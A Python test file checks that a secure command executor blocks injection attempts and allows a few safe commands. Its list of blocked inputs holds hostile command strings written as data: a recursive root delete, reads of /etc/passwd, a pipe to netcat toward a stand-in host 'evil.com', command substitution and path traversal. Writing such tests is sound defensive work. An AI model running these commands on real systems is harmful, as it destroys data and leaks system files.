#!/usr/bin/env python3
"""Test security fixes to ensure vulnerabilities are patched."""

from __future__ import annotations

# Local application imports
from secure_command_executor import SecureCommandExecutor


def test_command_injection_blocked() -> None:
    """Test that command injection attempts are blocked."""
    executor = SecureCommandExecutor()

    # Test cases that should be BLOCKED
    dangerous_commands = [
        "rm -rf /",  # Not in whitelist
        "bash -c 'evil command'",  # bash not allowed
        "sh script.sh",  # sh not allowed
        "echo test; rm -rf /",  # Shell metacharacters
        "echo test && cat /etc/passwd",  # Command chaining
        "echo test | nc evil.com 1234",  # Pipe to netcat
        "echo $(whoami)",  # Command substitution
        "echo `hostname`",  # Backtick substitution
        "ls ../../../../../../etc/passwd",  # Path traversal
        "find / -name passwd",  # Accessing root
    ]

    print("Testing command injection prevention...")
    blocked_count = 0

    for cmd in dangerous_commands:
        try:
            result = executor.execute(cmd, timeout=1)
            print(f"❌ FAILED: Command was NOT blocked: {cmd}")
            print(f"   Result: {result}")
        except ValueError:
            print(f"✅ BLOCKED: {cmd[:50]}...")
            blocked_count += 1
        except Exception as e:
            print(f"❌ Unexpected error for: {cmd}")
            print(f"   Error: {e}")

    print(f"\nBlocked {blocked_count}/{len(dangerous_commands)} dangerous commands")

    # Test cases that should be ALLOWED
    safe_commands = [
        "echo test",  # Simple echo
        "ws -sg",  # Workspace command
        "pwd",  # Current directory
        "ls -la",  # List with allowed flags
    ]

    print("\nTesting safe command execution...")
    allowed_count = 0

    for cmd in safe_commands:
        try:
            # Note: ws command would fail without proper environment
            # but should pass validation
            if cmd.startswith("ws"):
                result = executor.execute(cmd, timeout=1, allow_workspace_function=True)
            else:
                result = executor.execute(cmd, timeout=1)
            print(f"✅ ALLOWED: {cmd}")
            allowed_count += 1
        except ValueError as e:
            print(f"❌ FAILED: Safe command was blocked: {cmd}")
            print(f"   Error: {e}")
        except Exception as e:
            # ws commands might fail due to missing environment
            if "ws" in cmd:
                print(
                    f"✅ ALLOWED: {cmd} (validation passed, execution failed as expected)"
                )
                allowed_count += 1
            else:
                print(f"⚠️  Warning for: {cmd}")
                print(f"   Error: {e}")

    print(f"\nAllowed {allowed_count}/{len(safe_commands)} safe commands")

    # Summary
    print(f"\n{'🎉 SUCCESS' if blocked_count == len(dangerous_commands) else '⚠️  WARNING'}: "
          f"{blocked_count}/{len(dangerous_commands)} dangerous commands blocked")
    assert blocked_count == len(dangerous_commands), \
        f"Only {blocked_count}/{len(dangerous_commands)} dangerous commands were blocked"
